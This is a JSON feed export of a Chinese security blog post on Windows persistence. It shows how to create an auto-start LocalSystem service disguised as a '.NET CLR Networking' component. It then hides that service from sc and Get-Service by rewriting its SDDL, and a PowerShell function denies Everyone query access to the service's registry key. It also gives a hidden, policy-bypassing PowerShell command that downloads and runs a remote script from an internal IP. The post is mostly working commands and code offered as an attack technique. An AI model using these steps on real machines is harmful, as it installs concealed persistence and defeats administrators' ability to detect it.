{
    "version": "https://jsonfeed.org/version/1",
    "title": "竹林寺 • All posts by \"权限维持\" tag",
    "description": "请我喝咖啡！ψ(｀∇´)ψ",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "url": "http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "title": "win权限维持/安全描述符权限维持",
            "date_published": "2024-01-21T16:30:34.000Z",
            "content_html": "<p><strong>竹林寺</strong></p>\n<p><strong>cmd powershell 二选一</strong></p>\n<h2 id=\"1cmd创建自启动服务\"><a class=\"anchor\" href=\"#1cmd创建自启动服务\">#</a> 1.cmd 创建自启动服务</h2>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> binpath= <span class=\"string\">&quot;cmd.exe /k C:\\test.txt&quot;</span> depend= Tcpip obj= Localsystem start= auto  </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-powershell创建自启动服务\"><a class=\"anchor\" href=\"#2-powershell创建自启动服务\">#</a> 2. powershell 创建自启动服务</h2>\n<p><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">new-service</span> –Name <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –DisplayName <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –BinaryPathName <span class=\"string\">&quot;cmd.exe /k C:\\test.txt&quot;</span> – StartupType AutomaticDelayedStart  </span><br><span class=\"line\"><span class=\"built_in\">new-service</span> –Name <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –DisplayName <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –BinaryPathName <span class=\"string\">&quot;cmd.exe /k C:\\test.txt&quot;</span> –StartupType AutomaticDelayedStart</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"3-通过修改sddl安全描述符隐藏服务\"><a class=\"anchor\" href=\"#3-通过修改sddl安全描述符隐藏服务\">#</a> 3. 通过修改 SDDL (安全描述符) 隐藏服务</h2>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc sdset <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> <span class=\"string\">&quot;D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span>  </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-然后通过sc与get-server查找服务均无结果\"><a class=\"anchor\" href=\"#4-然后通过sc与get-server查找服务均无结果\">#</a> 4. 然后通过 sc 与 get-server 查找服务均无结果：</h2>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> sc query |findstr <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> </span><br><span class=\"line\">get-service | findstr <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span></span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973022722-fbb7ac7b-288b-485a-b7ce-805963a69e9f.png#averageHue=%2370c2db&amp;clientId=ua1aa948f-0eae-4&amp;from=paste&amp;height=289&amp;id=u67e5f115&amp;originHeight=289&amp;originWidth=929&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=113475&amp;status=done&amp;style=none&amp;taskId=u7c21d89d-d100-4425-b012-dd8b9e4cf84&amp;title=&amp;width=929\" alt=\"image.png\" /></p>\n<h2 id=\"5-但这样做有一个问题在注册表中很容易看到异常value\"><a class=\"anchor\" href=\"#5-但这样做有一个问题在注册表中很容易看到异常value\">#</a> 5. 但这样做有一个问题：在注册表中很容易看到异常 value。</h2>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973156783-c89ae77b-148f-4bcd-9970-b9351192a402.png#averageHue=%23fbfbfa&amp;clientId=ua1aa948f-0eae-4&amp;from=paste&amp;height=289&amp;id=ubc5fdbca&amp;originHeight=289&amp;originWidth=928&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=76377&amp;status=done&amp;style=none&amp;taskId=u36ac8e23-c73c-4683-8a7f-e87128fbc25&amp;title=&amp;width=928\" alt=\"image.png\" /></p>\n<h2 id=\"6-修改注册表acl\"><a class=\"anchor\" href=\"#6-修改注册表acl\">#</a> 6. 修改注册表 ACL</h2>\n<p><strong>我们可以通过修改注册表的 DACL 来拒绝对值的查询，达到隐藏异常值的效果。</strong><br />\n** 这里给出一个通过 powershell 修改注册表项的访问权限的简单脚本：   **</p>\n<p><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Server-Sddl-Change</span></span>&#123;</span><br><span class=\"line\">[<span class=\"type\">CmdletBinding</span>()]</span><br><span class=\"line\"><span class=\"keyword\">param</span></span><br><span class=\"line\">(</span><br><span class=\"line\">[<span class=\"type\">parameter</span>(<span class=\"type\">Mandatory</span>=<span class=\"variable\">$false</span>)][<span class=\"built_in\">String</span>]<span class=\"variable\">$Name</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"variable\">$ROOT</span> = <span class=\"string\">&quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$S</span> = <span class=\"variable\">$ROOT</span>+<span class=\"variable\">$NAME</span></span><br><span class=\"line\"><span class=\"variable\">$acl</span> = <span class=\"built_in\">Get-Acl</span> <span class=\"variable\">$S</span></span><br><span class=\"line\"><span class=\"variable\">$acl</span>.SetAccessRuleProtection(<span class=\"variable\">$true</span>, <span class=\"variable\">$false</span>)</span><br><span class=\"line\"><span class=\"variable\">$person</span> = [<span class=\"type\">System.Security.Principal.NTAccount</span>]<span class=\"string\">&quot;Everyone&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$access</span> = [<span class=\"type\">System.Security.AccessControl.RegistryRights</span>]<span class=\"string\">&quot;QueryValues&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$inheritance</span> = [<span class=\"type\">System.Security.AccessControl.InheritanceFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$propagation</span> = [<span class=\"type\">System.Security.AccessControl.PropagationFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$type</span> = [<span class=\"type\">System.Security.AccessControl.AccessControlType</span>]<span class=\"string\">&quot;Deny&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$rule</span> = <span class=\"built_in\">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class=\"line\"><span class=\"variable\">$person</span>,<span class=\"variable\">$access</span>,<span class=\"variable\">$inheritance</span>,<span class=\"variable\">$propagation</span>,<span class=\"variable\">$type</span>)</span><br><span class=\"line\"><span class=\"variable\">$acl</span>.AddAccessRule(<span class=\"variable\">$rule</span>)</span><br><span class=\"line\"><span class=\"variable\">$person</span> = [<span class=\"type\">System.Security.Principal.NTAccount</span>]<span class=\"string\">&quot;Everyone&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$access</span> =</span><br><span class=\"line\">[<span class=\"type\">System.Security.AccessControl.RegistryRights</span>]<span class=\"string\">&quot;SetValue,CreateSubKey,EnumerateSu</span></span><br><span class=\"line\"><span class=\"string\">bKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,Chang</span></span><br><span class=\"line\"><span class=\"string\">ePermissions,TakeOwnership&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$inheritance</span> = [<span class=\"type\">System.Security.AccessControl.InheritanceFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$propagation</span> = [<span class=\"type\">System.Security.AccessControl.PropagationFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$type</span> = [<span class=\"type\">System.Security.AccessControl.AccessControlType</span>]<span class=\"string\">&quot;Allow&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$rule</span> = <span class=\"built_in\">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class=\"line\"><span class=\"variable\">$person</span>,<span class=\"variable\">$access</span>,<span class=\"variable\">$inheritance</span>,<span class=\"variable\">$propagation</span>,<span class=\"variable\">$type</span>)</span><br><span class=\"line\"><span class=\"variable\">$acl</span>.AddAccessRule(<span class=\"variable\">$rule</span>)</span><br><span class=\"line\"><span class=\"built_in\">Set-Acl</span> <span class=\"variable\">$S</span> <span class=\"variable\">$acl</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"7-远程加载powershell脚本\"><a class=\"anchor\" href=\"#7-远程加载powershell脚本\">#</a> 7. 远程加载 powershell 脚本：</h2>\n<p><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell.exe <span class=\"literal\">-exec</span> bypass <span class=\"literal\">-nop</span> <span class=\"literal\">-w</span> <span class=\"keyword\">hidden</span> <span class=\"literal\">-c</span> <span class=\"string\">&quot;IEX((new-object</span></span><br><span class=\"line\"><span class=\"string\">net.webclient).downloadstring(&#x27;http://192.168.0.149/1.ps1&#x27;));Server-Sddl-Change -</span></span><br><span class=\"line\"><span class=\"string\">Name &#x27;.NET CLR Networking 3.5.0.0&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\"><a class=\"anchor\" href=\"#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\">#</a> 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：</h2>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973492501-06b273bb-dd0f-4db0-bc84-0af6838061a7.png#averageHue=%23fbfaf9&amp;clientId=ua1aa948f-0eae-4&amp;from=paste&amp;height=259&amp;id=ua87b4a87&amp;originHeight=259&amp;originWidth=926&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=61070&amp;status=done&amp;style=none&amp;taskId=u375f7037-0514-4820-aa72-7d5fd3ea1d0&amp;title=&amp;width=926\" alt=\"image.png\" /></p>\n",
            "tags": [
                "权限维持"
            ]
        }
    ]
}